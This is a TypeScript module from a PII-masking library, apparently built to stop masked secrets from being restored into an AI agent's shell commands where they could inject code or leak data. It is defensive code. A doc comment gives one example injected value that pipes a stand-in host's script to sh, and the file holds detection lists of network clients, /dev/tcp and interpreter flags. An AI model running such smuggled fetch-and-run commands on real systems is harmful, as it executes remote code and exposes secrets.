// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, each
 * placeholder gets its real value back only when that value is safe where
 * the placeholder stands; otherwise it stays literal, and the command
 * works on the placeholder text, which is harmless.
 *
 * No list names every program that reads its input again as code (a
 * here-string fed to `python3`, `watch "…"`, a script the same command
 * writes and runs), so two rules hold everywhere instead of depending on
 * one:
 * - the value is inert: no quote, backslash, `$`, backtick, shell
 *   operator, parenthesis, brace or control character, so it cannot end
 *   the string it lands in or start a command, whoever reads it;
 * - no word of it reads as an option (`-rf`), a comment or a home
 *   directory once a shell splits it.
 * The one exception is the body of a heredoc that `cat` or `tee` writes
 * out, in a command that runs nothing else that could read it as code
 * (`cat > notes.md <<'EOF'`, a `git commit -m "$(cat <<'EOF' …)"`
 * message): that body is data, as a file the `Write` tool writes is, so
 * only a line break is refused (and in a bare-delimiter body, which
 * expands, `$`, a backtick or a backslash).
 *
 * On top of them, in order:
 * - a command that sends data off the machine (`curl`, `ssh`, `gh`,
 *   `git push`, `dig`, …, also behind `sudo`, `env` or `timeout`) keeps
 *   every placeholder: the tool runs here, but the value would leave
 *   through it;
 * - a command that runs an interpreter or a program that evaluates its
 *   arguments (`bash`, `python3`, `node`, `eval`, `xargs`, `watch`, `make`,
 *   …, by name, by path or behind a wrapper), a program named by an
 *   expansion (`$PY`), or code handed on inside an argument
 *   (`docker run img sh -c "…"`) gets the strictest rule everywhere: one
 *   plain word;
 * - a heredoc body fed to anything but `cat` or `tee`, piped on, without
 *   its closing line, or in a command that runs a file (`./run.sh`,
 *   `chmod +x`): the strictest rule;
 * - otherwise the shell quoting: single quotes, `$'…'`, double quotes,
 *   backslash escapes, and command substitutions (`$(…)`, backticks),
 *   which are unquoted even inside double quotes.
 *
 * Heredoc bodies and `#` comments are skipped by the quote lexer (an
 * apostrophe in either does not open a quote for the rest of the
 * command); `<<` counts only in shell code, never inside quotes or as the
 * here-string `<<<`. The command is read once, whatever the number of
 * placeholders. A `command` given as an argv array
 * (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`. The Claude
 * Code mod gets the same rules through the sidecar's `restore` with
 * `tool`.
 *
 * Best effort for what leaves the machine: no list names every network
 * client, and a value restored into a file (`Write`, `Edit`) can be sent
 * by a later command.
 */

/** Tools whose input a shell runs, as each agent names them: Claude
 * Code's `Bash`, Anthropic's bash tool (`bash`), and the `shell` tool of
 * OpenAI-style agents such as Codex. */
export const SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

/** Where a placeholder stands. `heredoc` is the body of a quoted-delimiter
 * heredoc and `heredoc-expanding` that of a bare one, both only while the
 * body is data (see `DATA_PROGRAMS`); any other body is `none`. */
export type QuoteContext = 'none' | 'single' | 'double' | 'heredoc' | 'heredoc-expanding';

/** Contexts that hold data a program writes out, not shell code. */
const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set(['heredoc', 'heredoc-expanding']);

/** What a value restored into shell code must not hold: quotes,
 * backslash, `$`, backtick, operators, parentheses, braces, and control
 * characters (line breaks included). Without them a value cannot end the
 * string it lands in or start a command, in the shell or in a program the
 * shell hands it to. */
const SHELL_INERT = /^[^'"`\\$;&|<>(){}\p{Cc}\u2028\u2029]*$/u;

/** A word of the value that a command would read as an option (`-rf`,
 * `--upload-pack=…`), or that would start a comment or a home directory,
 * once a shell splits the value into words. */
const SPECIAL_WORD = /^[-#~]|\s(?:-\S|[#~])/u;

/** What a value may hold in each context, on top of `SHELL_INERT` and
 * `SPECIAL_WORD` outside data bodies. */
const SHELL_SAFE: Readonly<Record<QuoteContext, RegExp>> = {
  none: /^[A-Za-z0-9@%+=:,./_-]+$/,
  single: /^[^'\n]*$/,
  double: /^[^"$`\\!\n]*$/,
  // A quoted-delimiter body is literal; only a newline could end it early,
  // with the delimiter on a line of its own.
  heredoc: /^[^\n]*$/,
  'heredoc-expanding': /^[^$`\\\n]*$/,
};

/** The rest of one simple command, up to a bound: from an interpreter's
 * name to its code flag, past other options and their arguments. */
const SAME_COMMAND = String.raw`[^;&|\n]{0,256}?`;

/** Interpreter names, for the patterns that look inside quoted code. */
const INTERPRETER_NAMES = String.raw`(?:bash|sh|zsh|dash|ksh|fish|python[\d.]*|pypy[\d.]*|node|nodejs|bun|deno|perl|ruby|lua|php|Rscript|osascript|pwsh)`;

/** Code handed to an interpreter, read on the whole text so that it is
 * found where no program is read, inside an argument or a quoted string
 * (`docker run img sh -c "…"`, `find . -exec bash -c '…'`). Each code
 * flag may follow other options (`bash -o pipefail -c`); a flag cluster
 * counts when it holds the code letter (`-lc`). The program a command
 * itself runs is judged by name (`CODE_RUNNERS`). */
const NESTED_INTERPRETER = new RegExp(
  [
    String.raw`\b(?:bash|sh|zsh|dash|ksh|fish)\b${SAME_COMMAND}\s(?:-[A-Za-z]*c[A-Za-z]*|--command)\b`,
    String.raw`\beval\b|\bssh\b|\b(?:su|runuser|flock|script)\b${SAME_COMMAND}\s(?:-c|--command)\b`,
    String.raw`\b(?:python[\d.]*|pypy[\d.]*)\b${SAME_COMMAND}\s-[A-Za-z]*c[A-Za-z]*\b`,
    String.raw`\b(?:node|nodejs|bun|deno)\b${SAME_COMMAND}\s(?:-[A-Za-z]*[ep][A-Za-z]*|--eval|--print|eval)\b`,
    String.raw`\b(?:perl|ruby|lua|Rscript|osascript)\b${SAME_COMMAND}\s-[A-Za-z]*[eE][A-Za-z]*\b`,
    String.raw`\bphp\b${SAME_COMMAND}\s-[A-Za-z]*r[A-Za-z]*\b`,
    String.raw`\|&?\s*(?:sudo\s+)?(?:\S*/)?${INTERPRETER_NAMES}\b`,
    String.raw`\b${INTERPRETER_NAMES}\b${SAME_COMMAND}(?:<<<|[<>]\()`,
    /\b(?:awk|gawk|mawk|nawk|sed)\b/.source,
  ].join('|'),
);

/** Programs that run code given to them, in their arguments, their input
 * or a file: a value anywhere in a command that runs one may be read as
 * code. Lower case, without a version suffix (`python3.12` → `python`). */
const CODE_RUNNERS: ReadonlySet<string> = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'fish',
  'csh',
  'tcsh',
  'busybox',
  'python',
  'pypy',
  'node',
  'nodejs',
  'bun',
  'deno',
  'tsx',
  'ts-node',
  'perl',
  'ruby',
  'irb',
  'lua',
  'luajit',
  'php',
  'rscript',
  'r',
  'julia',
  'osascript',
  'pwsh',
  'powershell',
  'tclsh',
  'expect',
  'awk',
  'gawk',
  'mawk',
  'nawk',
  'sed',
  'gsed',
  'eval',
  'source',
  '.',
  'xargs',
  'watch',
  'parallel',
  'flock',
  'script',
  'su',
  'runuser',
  'tmux',
  'screen',
  'at',
  'batch',
  'entr',
  'make',
  'gmake',
  'just',
]);

/** Programs that run the program named after their own options, with the
 * options that take a separate argument. */
const WRAPPERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['sudo', new Set(['-u', '-g', '-h', '-p', '-r', '-t', '-C', '-D', '-U', '-T'])],
  ['doas', new Set(['-u', '-C'])],
  ['env', new Set(['-u', '-C', '--unset', '--chdir'])],
  ['nohup', new Set<string>()],
  ['command', new Set<string>()],
  ['builtin', new Set<string>()],
  ['exec', new Set(['-a'])],
  ['time', new Set(['-f', '-o', '--format', '--output'])],
  ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['ionice', new Set(['-c', '-n', '-p', '-P', '-u'])],
  ['stdbuf', new Set(['-i', '-o', '-e'])],
  ['setsid', new Set<string>()],
  ['unbuffer', new Set<string>()],
  ['caffeinate', new Set(['-t', '-w'])],
  ['chronic', new Set<string>()],
  ['xargs', new Set(['-I', '-n', '-P', '-L', '-d', '-E', '-s', '-a'])],
]);

/** Wrappers that take a positional argument before the program
 * (`timeout 5 cmd`). */
const WRAPPER_POSITIONALS: ReadonlyMap<string, number> = new Map([['timeout', 1]]);

/** Wrapper options that make it run a shell on a string, not a program
 * (`sudo -s`, `sudo -i`, `env -S "…"`). */
const WRAPPER_SHELL_OPTION: ReadonlyMap<string, RegExp> = new Map([
  ['sudo', /^-[A-Za-z]*[is]|^--(?:shell|login)$/],
  ['env', /^-[A-Za-z]*S|^--split-string/],
]);

/** Programs that send what they are given off the machine. Lower case. */
const NETWORK_PROGRAMS: ReadonlySet<string> = new Set([
  'curl',
  'curlie',
  'wget',
  'aria2c',
  'http',
  'https',
  'httpie',
  'xh',
  'nc',
  'nc.openbsd',
  'nc.traditional',
  'ncat',
  'netcat',
  'socat',
  'telnet',
  'ssh',
  'scp',
  'sftp',
  'rsync',
  'ftp',
  'lftp',
  'tftp',
  'ncftp',
  'websocat',
  'wscat',
  'grpcurl',
  'gh',
  'glab',
  'hub',
  'dig',
  'nslookup',
  'host',
  'drill',
  'kdig',
  'ping',
  'traceroute',
  'tracepath',
  'mtr',
  'whois',
  'nmap',
  'mail',
  'mailx',
  'sendmail',
  'mutt',
  'msmtp',
  'swaks',
  'aws',
  'gcloud',
  'gsutil',
  'bq',
  'az',
  'doctl',
  'oci',
  'kubectl',
  'helm',
  'oc',
  'heroku',
  'fly',
  'flyctl',
  'vercel',
  'netlify',
  'wrangler',
  'firebase',
  'supabase',
  'rclone',
  's3cmd',
  'smbclient',
  'iwr',
  'irm',
  'invoke-webrequest',
  'invoke-restmethod',
]);

/** Programs that send data out only through some of their subcommands;
 * a command counts when any of its words is one. */
const NETWORK_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  [
    'git',
    new Set([
      'push',
      'pull',
      'fetch',
      'clone',
      'ls-remote',
      'remote',
      'submodule',
      'send-email',
      'request-pull',
    ]),
  ],
  ['docker', new Set(['push', 'pull', 'login'])],
  ['podman', new Set(['push', 'pull', 'login'])],
  ['buildah', new Set(['push', 'pull', 'login'])],
  ['npm', new Set(['publish', 'login', 'adduser'])],
  ['pnpm', new Set(['publish', 'login'])],
  ['yarn', new Set(['publish', 'login', 'npm'])],
  ['bun', new Set(['publish'])],
  ['cargo', new Set(['publish', 'login'])],
  ['gem', new Set(['push', 'signin'])],
  ['twine', new Set(['upload'])],
  ['poetry', new Set(['publish'])],
  ['uv', new Set(['publish'])],
  ['openssl', new Set(['s_client', 's_server', 'ocsp'])],
]);

/** Network clients found anywhere in the text, inside quoted code too:
 * names that cannot be anything else (not after `.`, `/`… so `~/.ssh`
 * does not count), uploads by `git` and package managers, and `/dev/tcp`.
 * Best effort: no list names every way out. */
const NETWORK_CLIENT = new RegExp(
  [
    /(?<![\w.-])(?:curl|wget|ncat|netcat|socat|ssh|scp|sftp|rsync|telnet|aria2c|nslookup|traceroute|sendmail|mailx|websocat|wscat|grpcurl|gcloud|gsutil|kubectl|rclone|s3cmd|smbclient)(?![\w-])/
      .source,
    /\b(?:Invoke-WebRequest|Invoke-RestMethod)\b/.source,
    String.raw`\bgit\b${SAME_COMMAND}\s(?:push|pull|fetch|clone|ls-remote|remote|submodule|send-email)\b`,
    String.raw`\b(?:npm|pnpm|yarn|bun|cargo)\b${SAME_COMMAND}\spublish\b`,
    /\/dev\/(?:tcp|udp)\//.source,
  ].join('|'),
  'i',
);

/** In a command that runs code: a URL, a networking library, or a short
 * network client name, which that code may use. */
const NETWORK_IN_CODE =
  /[a-z][a-z0-9+.-]*:\/\/|\b(?:requests|urllib|httpx|aiohttp|socket|fetch|axios|XMLHttpRequest|WebSocket|LWP|IO::Socket|Net::HTTP|http\.client|net\.connect|nc|gh|dig|ping|ftp|xh|aws)\b/;

/** Programs whose arguments and input are data, so that a heredoc body
 * in a command that runs only these is data too. */
const DATA_PROGRAMS: ReadonlySet<string> = new Set([
  'cat',
  'tee',
  'echo',
  'printf',
  'mkdir',
  'cd',
  'touch',
  'ls',
  'pwd',
  'true',
  ':',
]);

/** `git` subcommands whose heredoc arguments are data (a commit message). */
const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set(['commit']);

/** Programs that make a file executable, to run it. */
const RUNS_FILE_PROGRAMS: ReadonlySet<string> = new Set(['chmod']);

/** Shell words that come before the program of a simple command. */
const LEADING_KEYWORDS: ReadonlySet<string> = new Set([
  'if',
  'then',
  'else',
  'elif',
  'do',
  'while',
  'until',
  '!',
  '{',
  'coproc',
]);

/** Shell words that start a simple command with no program to run. */
const NO_PROGRAM_KEYWORDS: ReadonlySet<string> = new Set([
  'for',
  'case',
  'select',
  'function',
  'fi',
  'done',
  'esac',
  '}',
  '[[',
]);

/** How many words of a simple command are read, and how far: enough for
 * wrappers, the program and its subcommand, bounded on long input. */
const MAX_WORDS = 64;
const MAX_WORD_SCAN = 4096;

/** A heredoc operator, read at one position: `<<` or `<<-`, then a
 * delimiter that is quoted (`'EOF'`, `"EOF"`), backslash-escaped (`\EOF`)
 * or bare (`EOF`). Groups: 1 dash, 3 quoted word, 4 escaped word, 5 bare. */
const HEREDOC_OPERATOR = /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))/;

/** Commands whose heredoc body is data, not code. */
const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);

/** Characters after which a new simple command starts (see
 * `separatesCommands`). */
const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', '{']);
const REDIRECTION_SIDES: ReadonlySet<string> = new Set(['<', '>']);

/** Characters after which `#` starts a comment: it must begin a word.
 * Not `$` (`$#`) or `{` (`${#x}`). A backtick counts, so a doubtful `#`
 * is read as a comment, which only makes the context after it stricter. */
const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
  ' ',
  '\t',
  '\n',
  ';',
  '&',
  '|',
  '(',
  ')',
  '<',
  '>',
  '`',
]);

const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
const LEADING_TABS = /^\t+/;
const WHITESPACE = /\s/;
/** A redirection word (`>`, `2>>log`, `&>`, `<in`); group 1 is empty
 * when the operator stands alone and its target is the next word. */
const REDIRECTION = /^\d*(?:[<>]{1,3}|&>>?|[<>]&)(\S*)$/;
/** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;

type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'ansi' | 'double' | 'body';

/** Shell code, where quotes, substitutions and operators mean something. */
const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);

/** One level of shell nesting. `ansi` is `$'…'`, where backslash escapes
 * apply. `body` is an unquoted heredoc body: it expands `$` and backticks
 * like double quotes, but `"` is literal. In a code frame, `cmdStart` is
 * where the current simple command began, and `depth` counts the `(`
 * opened inside a `$(…)`. */
interface Frame {
  readonly kind: FrameKind;
  depth: number;
  cmdStart: number;
}

/** A heredoc whose body starts at the next newline of shell code. */
interface Heredoc {
  /** `undefined` when the delimiter could not be read. */
  readonly delimiter: string | undefined;
  /** Quoted or escaped delimiter: the body is literal. */
  readonly literal: boolean;
  /** `<<-`: leading tabs are stripped from the closing line. */
  readonly stripTabs: boolean;
  /** Fed to `cat` or `tee` and not piped on, so the body is data. */
  readonly data: boolean;
}

/** One pass over a command: the context at each target position, in
 * order, and the extent of every simple command met in shell code. */
interface Scan {
  readonly targets: readonly number[];
  readonly contexts: QuoteContext[];
  readonly commands: Array<readonly [number, number]>;
}

/** A word of a simple command, quotes and escapes removed; `computed`
 * when it holds an expansion, so its value is known only at run time. */
interface Word {
  readonly text: string;
  readonly computed: boolean;
}

/** What one simple command runs. */
interface Program {
  /** Lower case, without directory or version suffix; `undefined` when
   * an expansion names it (`$PY`, `$(which python3)`). */
  readonly name: string | undefined;
  /** Named by a path (`./run.sh`, `/tmp/x`): it runs a file. */
  readonly byPath: boolean;
  /** The wrappers it runs behind, normalised like `name`. */
  readonly wrappers: readonly string[];
  /** A wrapper runs a shell on a string (`sudo -s`, `env -S`). */
  readonly wrapperShell: boolean;
  /** Its arguments, as far as they were read. */
  readonly args: readonly string[];
}

/** What a command does, as far as restoring into it is concerned. */
interface Verdict {
  /** It sends data off the machine: nothing is restored. */
  readonly offMachine: boolean;
  /** The context at each placeholder position, keyed by index. */
  readonly contextAt: ReadonlyMap<number, QuoteContext>;
}

/** True when `name` is one of the `SHELL_TOOLS`. */
export function isShellTool(name: unknown): boolean {
  return typeof name === 'string' && SHELL_TOOLS.has(name);
}

/** True when `command` sends data off the machine: a network client or an
 * upload, behind any wrapper, or code it runs that opens a URL or a
 * socket. */
export function sendsOffMachine(command: string): boolean {
  return judge(command, []).offMachine;
}

/** True when `value` can be put back as written in `context`: inert and
 * with no special word outside a data body, and within the context's own
 * rule everywhere. */
export function shellSafe(value: string, context: QuoteContext): boolean {
  if (DATA_BODY_CONTEXTS.has(context)) return SHELL_SAFE[context].test(value);
  if (SPECIAL_WORD.test(value) || !SHELL_INERT.test(value)) return false;
  return SHELL_SAFE[context].test(value);
}

/**
 * The context that decides what a restored value may contain at `index`
 * of a shell command: the strictest rule when the command runs code it
 * is handed, else the heredoc body or the shell quoting there.
 */
export function shellContextAt(command: string, index: number): QuoteContext {
  return judge(command, [index]).contextAt.get(index) ?? 'none';
}

/** Read `command` once and judge it at each of `targets` (ascending). */
function judge(command: string, targets: readonly number[]): Verdict {
  const scan: Scan = { targets, contexts: [], commands: [] };
  lex(command, 0, command.length, codeFrame(), scan);
  const programs = scan.commands.flatMap(([start, end]) => {
    const p = programOf(wordsOf(command.slice(start, Math.min(end, start + MAX_WORD_SCAN))));
    return p === undefined ? [] : [p];
  });
  const strict = NESTED_INTERPRETER.test(command) || programs.some(runsCode);
  const offMachine =
    NETWORK_CLIENT.test(command) ||
    programs.some(sendsOut) ||
    (strict && NETWORK_IN_CODE.test(command));
  const bodyContext = dataBodyContext(programs, strict);
  const contextAt = new Map<number, QuoteContext>();
  targets.forEach((index, k) => {
    const context = scan.contexts[k] ?? 'none';
    if (strict) contextAt.set(index, 'none');
    else if (DATA_BODY_CONTEXTS.has(context)) contextAt.set(index, bodyContext(context));
    else contextAt.set(index, context);
  });
  return { offMachine, contextAt };
}

/** What a data heredoc body's context becomes, given the programs the
 * command runs: kept when they all treat it as data, the strictest rule
 * when one runs a file, else the double-quote rule. */
function dataBodyContext(
  programs: readonly Program[],
  strict: boolean,
): (context: QuoteContext) => QuoteContext {
  if (strict || programs.some(runsFile)) return () => 'none';
  if (programs.every(isDataProgram)) return (context) => context;
  return () => 'double';
}

function runsCode(p: Program): boolean {
  if (p.name === undefined || p.wrapperShell) return true;
  return CODE_RUNNERS.has(p.name) || p.wrappers.some((w) => CODE_RUNNERS.has(w));
}

function sendsOut(p: Program): boolean {
  if (p.name === undefined) return false;
  if (NETWORK_PROGRAMS.has(p.name)) return true;
  const subcommands = NETWORK_SUBCOMMANDS.get(p.name);
  return subcommands !== undefined && p.args.some((a) => subcommands.has(a));
}

function runsFile(p: Program): boolean {
  return p.byPath || (p.name !== undefined && RUNS_FILE_PROGRAMS.has(p.name));
}

function isDataProgram(p: Program): boolean {
  if (p.name === undefined || p.wrappers.length > 0 || p.byPath) return false;
  if (p.name === 'git') return DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
  return DATA_PROGRAMS.has(p.name);
}

/** The words at the start of a simple command, up to `MAX_WORDS` and a
 * `#` comment. */
function wordsOf(text: string): Word[] {
  const words: Word[] = [];
  let word = '';
  let inWord = false;
  let computed = false;
  let quote: string | undefined;
  const flush = (): void => {
    if (inWord) words.push({ text: word, computed });
    word = '';
    inWord = false;
    computed = false;
  };
  for (let i = 0; i < text.length && words.length < MAX_WORDS; i++) {
    const ch = text[i] ?? '';
    if (quote === "'") {
      if (ch === "'") quote = undefined;
      else word += ch;
      continue;
    }
    if (ch === '\\') {
      // A backslash before a newline continues the line; before anything
      // else it makes that character literal.
      const next = text[i + 1] ?? '';
      if (next !== '\n') {
        word += next;
        inWord = true;
      }
      i++;
      continue;
    }
    if (ch === '$' || ch === '`') computed = true;
    if (quote === '"') {
      if (ch === '"') quote = undefined;
      else word += ch;
      continue;
    }
    if (ch === '#' && !inWord) break;
    if (ch === "'" || ch === '"') {
      quote = ch;
      inWord = true;
    } else if (WHITESPACE.test(ch)) flush();
    else {
      word += ch;
      inWord = true;
    }
  }
  if (words.length < MAX_WORDS) flush();
  return words;
}

/** The program a simple command runs: past shell keywords, environment
 * assignments, redirections and wrappers with their options. `undefined`
 * when it runs none (`for`, `fi`, a bare assignment). */
function programOf(words: readonly Word[]): Program | undefined {
  let k = skipPrefix(words, 0);
  const first = words[k];
  if (first === undefined || NO_PROGRAM_KEYWORDS.has(first.text)) return undefined;
  const wrappers: string[] = [];
  let wrapperShell = false;
  for (;;) {
    const word = words[k];
    // A wrapper with nothing after it runs on its own (`xargs` reads the
    // command from its input).
    if (word === undefined) {
      const last = wrappers.at(-1);
      if (last === undefined) return undefined;
      return { name: last, byPath: false, wrappers, wrapperShell, args: [] };
    }
    const name = word.computed ? undefined : normalise(word.text);
    const options = name === undefined ? undefined : WRAPPERS.get(name);
    if (options === undefined || name === undefined) {
      const args = words.slice(k + 1).map((w) => w.text);
      return { name, byPath: word.text.includes('/'), wrappers, wrapperShell, args };
    }
    wrappers.push(name);
    const skipped = skipWrapperArgs(words, k + 1, name, options);
    wrapperShell ||= skipped.shell;
    k = skipped.next;
  }
}

/** Skip a wrapper's options (with their arguments), assignments and
 * positional arguments from `k`, up to the program it runs; `shell` when
 * one of those options makes it run a shell on a string. */
function skipWrapperArgs(
  words: readonly Word[],
  k: number,
  wrapper: string,
  options: ReadonlySet<string>,
): { next: number; shell: boolean } {
  const shellOption = WRAPPER_SHELL_OPTION.get(wrapper);
  let left = WRAPPER_POSITIONALS.get(wrapper) ?? 0;
  let shell = false;
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return { next: i, shell };
    if (text.startsWith('-') && text !== '-') {
      shell ||= shellOption?.test(text) === true;
      i += options.has(text) ? 2 : 1;
    } else if (ENV_ASSIGNMENT.test(text)) i += 1;
    else if (left > 0) {
      left -= 1;
      i += 1;
    } else return { next: i, shell };
  }
}

/** Skip shell keywords, assignments and redirections from `k`. */
function skipPrefix(words: readonly Word[], k: number): number {
  let i = k;
  for (;;) {
    const text = words[i]?.text;
    if (text === undefined) return i;
    if (LEADING_KEYWORDS.has(text) || ENV_ASSIGNMENT.test(text)) {
      i += 1;
      continue;
    }
    const m = REDIRECTION.exec(text);
    if (m === null) return i;
    i += m[1] === '' ? 2 : 1;
  }
}

/** A program name as the sets list it: no directory, lower case, no
 * version or `.exe` suffix (`/usr/bin/Python3.12` → `python`). */
function normalise(word: string): string {
  const base = (word.split('/').at(-1) ?? word).toLowerCase();
  const bare = base.replace(PROGRAM_SUFFIX, '');
  return bare === '' ? base : bare;
}

function codeFrame(): Frame {
  return { kind: 'code', depth: 0, cmdStart: 0 };
}

/** Lex `command` from `start` to `end`, with `base` as the nesting in
 * force at `start`: record the context at each target in range, and the
 * extent of each simple command of shell code. */
function lex(command: string, start: number, end: number, base: Frame, scan: Scan): void {
  const stack: Frame[] = [base];
  const pending: Heredoc[] = [];
  let i = start;
  while (i < end) {
    record(scan, i, contextOf(stack));
    const frame = stack.at(-1) ?? base;
    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
      scan.commands.push([frame.cmdStart, i]);
      const next = readHeredocBodies(command, i + 1, pending, scan);
      // An unreadable delimiter or no closing line: the body's extent, and
      // so what follows it, is unknown.
      if (next === undefined) {
        record(scan, Number.POSITIVE_INFINITY, 'none');
        return;
      }
      pending.length = 0;
      frame.cmdStart = next;
      i = next;
      continue;
    }
    i += advance(stack, frame, pending, command, i, scan);
  }
  record(scan, end - 1, contextOf(stack));
  for (const frame of stack) {
    if (CODE_KINDS.has(frame.kind)) scan.commands.push([frame.cmdStart, end]);
  }
}

/** Give `context` to every target not yet recorded up to `limit`. */
function record(scan: Scan, limit: number, context: QuoteContext): void {
  for (;;) {
    const target = scan.targets[scan.contexts.length];
    if (target === undefined || target > limit) return;
    scan.contexts.push(context);
  }
}

function contextOf(stack: readonly Frame[]): QuoteContext {
  const kind = stack.at(-1)?.kind;
  if (kind === 'single' || kind === 'ansi') return 'single';
  if (kind === 'double') return 'double';
  if (kind === 'body') return 'heredoc-expanding';
  return 'none';
}

/** Read the token at `i`, update the nesting, return its length. */
function advance(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (frame.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (frame.kind === 'ansi') {
    if (ch === '\\') return 2;
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
    return 2;
  }
  if (ch === '`') {
    if (frame.kind === 'backtick') closeCommand(stack, frame, i, scan);
    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
    return 1;
  }
  if (frame.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  if (frame.kind === 'body') return 1;
  return advanceCode(stack, frame, pending, command, i, scan);
}

/** One token of shell code: the top level, or inside a substitution. */
function advanceCode(
  stack: Frame[],
  frame: Frame,
  pending: Heredoc[],
  command: string,
  i: number,
  scan: Scan,
): number {
  const ch = command[i];
  if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
  if (ch === '<' && command[i + 1] === '<') return readHeredocOperator(command, i, frame, pending);
  if (ch === '$' && command[i + 1] === "'") {
    stack.push({ kind: 'ansi', depth: 0, cmdStart: 0 });
    return 2;
  }
  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
  else if (frame.kind === 'subst') trackParens(stack, frame, ch, i, scan);
  if (separatesCommands(command, i)) {
    scan.commands.push([frame.cmdStart, i]);
    frame.cmdStart = i + 1;
  }
  return 1;
}

/** True when the character at `i` of shell code ends a simple command.
 * `{` only as the grouping word (`{ cmd; }`), not in `${x}` or `-I{}`;
 * `&` only as an operator, not in a redirection (`2>&1`, `&>log`). */
function separatesCommands(command: string, i: number): boolean {
  const ch = command[i];
  if (ch === undefined || !COMMAND_SEPARATORS.has(ch)) return false;
  if (ch === '{') return startsWord(command, i) && WHITESPACE.test(command[i + 1] ?? '');
  if (ch !== '&') return true;
  return !REDIRECTION_SIDES.has(command[i - 1] ?? '') && command[i + 1] !== '>';
}

/** True when the character at `i` begins a word of shell code. */
function startsWord(command: string, i: number): boolean {
  const before = command[i - 1];
  return before === undefined || COMMENT_PRECEDERS.has(before);
}

/** A comment runs to the end of its line; the newline is left to the
 * caller, since heredoc bodies may start after it. */
function commentLength(command: string, i: number): number {
  const newline = command.indexOf('\n', i);
  return (newline === -1 ? command.length : newline) - i;
}

function trackParens(
  stack: Frame[],
  frame: Frame,
  ch: string | undefined,
  i: number,
  scan: Scan,
): void {
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth === 0) closeCommand(stack, frame, i, scan);
  else frame.depth -= 1;
}

/** Close a substitution at `i`, recording its last simple command. */
function closeCommand(stack: Frame[], frame: Frame, i: number, scan: Scan): void {
  scan.commands.push([frame.cmdStart, i]);
  stack.pop();
}

/** Record the heredoc whose operator starts at `i`; return its length.
 * `<<<` is a here-string: the word after it is an ordinary argument. */
function readHeredocOperator(command: string, i: number, frame: Frame, pending: Heredoc[]): number {
  if (command[i + 2] === '<') return 3;
  const operator = new RegExp(HEREDOC_OPERATOR.source, 'y');
  operator.lastIndex = i;
  const m = operator.exec(command);
  if (m === null) {
    pending.push({ delimiter: undefined, literal: false, stripTabs: false, data: false });
    return 2;
  }
  const newline = command.indexOf('\n', i);
  const restOfLine = command.slice(i, newline === -1 ? command.length : newline);
  const word = commandWord(command.slice(frame.cmdStart, i));
  const quoted = m[3] ?? m[4];
  pending.push({
    delimiter: quoted ?? m[5],
    literal: quoted !== undefined,
    stripTabs: m[1] === '-',
    data: HEREDOC_DATA_COMMANDS.has(word) && !restOfLine.includes('|'),
  });
  return m[0].length;
}

/** The program a simple command runs: its first word that is not an
 * environment assignment, without a directory (`/bin/cat` → `cat`). */
function commandWord(text: string): string {
  const word = text
    .trim()
    .split(/\s+/)
    .find((w) => !ENV_ASSIGNMENT.test(w));
  return word?.split('/').at(-1) ?? '';
}

/** Walk the bodies of the heredocs that start at `start`, in order,
 * recording the targets in each; return where shell code resumes, or
 * `undefined` when a body has no closing line. */
function readHeredocBodies(
  command: string,
  start: number,
  pending: readonly Heredoc[],
  scan: Scan,
): number | undefined {
  let bodyStart = start;
  for (const heredoc of pending) {
    const end = findClosingLine(command, bodyStart, heredoc);
    if (end === undefined) return undefined;
    readBody(command, bodyStart, end.bodyEnd, heredoc, scan);
    bodyStart = end.next;
  }
  return bodyStart;
}

/** Record the targets in one body. A bare-delimiter body is lexed too,
 * since its substitutions run whatever reads the body. */
function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
  if (!heredoc.data) record(scan, end - 1, 'none');
  else if (heredoc.literal) record(scan, end - 1, 'heredoc');
  if (heredoc.literal) return;
  lex(command, start, end, { kind: 'body', depth: 0, cmdStart: 0 }, scan);
}

